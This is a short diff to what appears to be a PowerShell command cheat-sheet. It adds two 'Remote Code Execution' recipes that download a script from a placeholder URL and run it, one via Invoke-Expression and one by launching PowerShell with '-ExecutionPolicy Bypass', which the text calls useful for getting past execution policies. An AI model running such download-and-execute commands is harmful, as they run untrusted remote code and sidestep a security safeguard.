@@ -57,3 +57,11 @@
 `$creds = Get-Credential`  
 `$script = { Write-Output "Test text!" }`  
 `Invoke-Command -ComputerName $computer -Credential $creds -ScriptBlock $script`  
+#\ Remote Code Execution - Invoke-RestMethod (Download and run remote scripts)  
+`$url = "https://site.com/script.ps1"`  
+`$script = Invoke-RestMethod -Uri $url`  
+`Invoke-Expression $script`  
+\# Remote Code Execution - Start-Process (open a new PS instance and run a downloaded script - useful to bypass execution policies)  
+`$url = "https://site.com/script.ps1"`  
+`Invoke-WebRequest -Uri $url -OutFile "script.ps1"`  
+`Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File script.ps1"`  
